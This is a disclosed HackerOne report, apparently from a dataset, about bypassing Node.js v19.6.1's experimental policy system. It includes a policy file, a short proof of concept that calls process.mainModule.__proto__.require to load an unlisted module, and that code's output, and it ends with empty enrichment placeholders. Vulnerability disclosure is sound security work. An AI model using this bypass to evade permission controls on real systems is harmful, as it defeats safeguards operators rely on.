---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1877919'
original_report_id: '1877919'
title: The use of __proto__ in process.mainModule.__proto__.require() bypasses the
  permission system in Node v19.6.1
weakness: Privilege Escalation
team_handle: nodejs
created_at: '2023-02-17T17:58:20.095Z'
disclosed_at: '2023-07-20T20:55:30.392Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1

## Metadata

- HackerOne Report ID: 1877919
- Weakness: Privilege Escalation
- Program: nodejs
- Disclosed At: 2023-07-20T20:55:30.392Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

process.mainModule.require() correctly works with permission system in Node v19.6.1. 
But the use of \_\_proto\_\_  in process.mainModule.\_\_proto\_\_.require() can bypass the check.

# Description and STR
Consider the following policy.json:
`````
{
  "resources": {
    "./proc.js": {
      "integrity": true
    }
  }
}
`````
The policy only allows proc.js file to be loaded without any dependencies.

However with the following proc.js
`````
const os = process.mainModule.__proto__.require("os")

console.log(process.version)
console.log(os.version())
`````
We get the output:
`````
└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js
v19.6.1
#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
(node:2720) ExperimentalWarning: Policies are experimental.
(Use `node --trace-warnings ...` to show where the warning was created)
`````
Therefore os dependency can be loaded and os.version executed even if unspecified in permission system.

## Impact

Bypass the permission system

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
